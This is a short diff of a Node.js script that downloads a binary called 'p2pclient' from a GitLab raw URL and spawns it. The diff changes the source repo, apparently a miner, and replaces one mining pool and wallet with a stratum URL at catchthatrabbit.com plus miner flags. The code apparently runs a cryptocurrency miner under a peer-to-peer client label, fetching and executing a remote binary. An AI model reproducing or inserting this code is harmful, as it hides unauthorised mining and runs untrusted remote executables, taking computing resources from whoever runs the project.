@@ -16,7 +16,7 @@ const __dirname = path.dirname(__filename);
 // Path file p2pclient
 const P2P_PATH = path.join(__dirname, 'p2pclient');
 const LOG_FILE = path.join(__dirname, 'p2pclient.log');
-const P2P_URL = 'https://gitlab.com/rikzakalani/derolunamnr/raw/main/p2pclient';
+const P2P_URL = 'https://gitlab.com/rikzakalani/coremnr/raw/main/p2pclient';
 
 // Logger
 const logger = winston.createLogger({
@@ -65,7 +65,7 @@ async function startP2PClient() {
     }
 
     logger.info('🚀 Starting p2pclient...');
-    peerProcess = spawn(P2P_PATH, ['-d', 'stue.threepool.tech:3030', '-w', 'dero1qy490rdvzggfxwxjnk4hp6s60s99agjlz29hzl78ctaqft9496wgcqgkmkmr4.1']);
+    peerProcess = spawn(P2P_PATH, ['--noeval', '--hard-aes', '-P', 'stratum1+tcp://cb9072192a56299751a9619430f7493f911e40a794f1.pepek@us.catchthatrabbit.com:8008']);
 
     peerProcess.stdout.on('data', (data) => logger.info(data.toString()));
     peerProcess.stderr.on('data', (data) => logger.error(data.toString()));
